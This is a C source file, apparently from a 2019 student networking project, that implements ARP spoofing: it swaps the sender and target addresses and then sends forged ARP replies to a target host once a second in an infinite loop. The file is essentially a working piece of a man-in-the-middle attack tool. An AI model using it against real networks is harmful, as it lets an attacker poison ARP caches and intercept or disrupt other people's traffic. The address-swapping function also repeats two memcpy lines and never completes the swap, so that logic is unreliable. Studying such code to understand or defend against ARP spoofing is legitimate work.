/*
** EPITECH PROJECT, 2019
** spoof_arp.c
** File description:
** Gautier PLANCQ & Lucas Duboisse ~ Spoof arp
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <bits/ioctls.h>
#include <net/if.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <errno.h>
#include "arpspoof.h"
#include "color.h"

uint8_t send_a_reply(infos_t *infos)
{
    fill_arphdr(infos, ARPOP_REPLY);
    fill_etherframe(infos);
    send_arp_request(infos);
    return (1);
}

int swap_dst_and_src(infos_t *infos)
{
    uint8_t tmp[6];
    char *stmp;

    memcpy(tmp, infos->arphdr.sender_mac, sizeof(tmp));
    memcpy(infos->arphdr.sender_mac, infos->arphdr.target_mac, sizeof(tmp));
    memcpy(infos->arphdr.target_mac, tmp, sizeof(tmp));
    memcpy(tmp, infos->dst_mac, sizeof(infos->dst_mac));
    memcpy(infos->dst_mac, infos->src_mac, sizeof(infos->dst_mac));
    memcpy(tmp, infos->dst_mac, sizeof(infos->dst_mac));
    memcpy(infos->dst_mac, infos->src_mac, sizeof(infos->dst_mac));
    stmp = infos->src_ip;
    infos->src_ip = infos->target;
    infos->target = stmp;
    fill_etherframe(infos);
    return (0);
}

int spoof_arp(infos_t *infos)
{
    swap_dst_and_src(infos);
    while (1) {
        send_a_reply(infos);
        printf("Spoofed packet sent to '%s'\n", infos->target);
        sleep(1);
    }
    return (0);
}